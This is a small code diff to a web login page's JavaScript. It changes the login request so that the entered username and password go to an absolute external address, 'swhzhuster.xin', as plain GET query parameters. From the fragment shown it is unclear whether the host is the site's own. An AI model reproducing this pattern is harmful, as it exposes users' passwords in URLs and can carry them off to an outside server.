@@ -35,7 +35,7 @@
                 e.returnValue=false;
             }
             var xhr=new XMLHttpRequest();
-            xhr.open("GET","login.php?username="+document.getElementById("name").value+
+            xhr.open("GET","https://swhzhuster.xin/login.php?username="+document.getElementById("name").value+
             "&userpwd="+document.getElementById("pwd").value);
             xhr.send();
             xhr.onreadystatechange=function() {
